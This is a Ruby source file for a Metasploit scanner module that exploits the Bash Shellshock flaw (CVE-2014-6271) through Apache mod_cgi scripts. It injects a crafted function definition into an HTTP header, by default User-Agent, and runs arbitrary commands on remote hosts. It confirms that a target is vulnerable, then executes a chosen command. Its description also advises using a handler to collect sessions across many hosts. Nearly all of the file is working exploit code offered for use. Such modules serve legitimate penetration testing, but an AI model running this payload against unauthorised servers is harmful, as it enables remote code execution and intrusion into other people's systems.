##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Apache mod_cgi Bash Environment Variable Code Injection',
      'Description' => %q{
        This module exploits a code injection in specially crafted environment
        variables in Bash, specifically targeting Apache mod_cgi scripts through
        the HTTP_USER_AGENT variable by default.

        PROTIP: Use exploit/multi/handler with a PAYLOAD appropriate to your
        CMD, set ExitOnSession false, run -j, and then run this module to create
        sessions on vulnerable hosts.
      },
      'Author' => [
        'Stephane Chazelas', # Vulnerability discovery
        'wvu' # Metasploit module
      ],
      'References' => [
        ['CVE', '2014-6271'],
        ['URL', 'https://access.redhat.com/articles/1200223'],
        ['URL', 'http://seclists.org/oss-sec/2014/q3/649']
      ],
      'DisclosureDate' => 'Sep 24 2014',
      'License' => MSF_LICENSE
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Path to CGI script']),
      OptString.new('METHOD', [true, 'HTTP method to use', 'GET']),
      OptString.new('HEADER', [true, 'HTTP header to use', 'User-Agent']),
      OptString.new('CMD', [true, 'Command to run (absolute paths required)',
        '/usr/bin/id'])
    ], self.class)

    @marker = marker
  end

  def check_host(ip)
    res = req("echo #{@marker}")

    if res && res.body.include?(@marker * 3)
      report_vuln(
        :host => ip,
        :port => rport,
        :name => self.name,
        :refs => self.references
      )
      return Exploit::CheckCode::Vulnerable
    elsif res && res.code == 500
      injected_res_code = res.code
    else
      return Exploit::CheckCode::Safe
    end

    res = send_request_cgi({
      'method' => datastore['METHOD'],
      'uri' => normalize_uri(target_uri.path.to_s)
    })

    if res && injected_res_code == res.code
      return Exploit::CheckCode::Unknown
    elsif res && injected_res_code != res.code
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Unknown
  end

  def run_host(ip)
    return unless check_host(ip) == Exploit::CheckCode::Vulnerable

    res = req(datastore['CMD'])

    if res && res.body =~ /#{@marker}(.+)#{@marker}/m
      print_good("#{peer} - #{$1}")
      report_vuln(
        :host => ip,
        :port => rport,
        :name => self.name,
        :refs => self.references
      )
    end
  end

  def req(cmd)
    send_request_cgi(
      'method' => datastore['METHOD'],
      'uri' => normalize_uri(target_uri.path),
      'headers' => {
        datastore['HEADER'] => "() { :;};echo #{@marker}$(#{cmd})#{@marker}"
      }
    )
  end

  def marker
    Rex::Text.rand_text_alphanumeric(rand(42) + 1)
  end

end
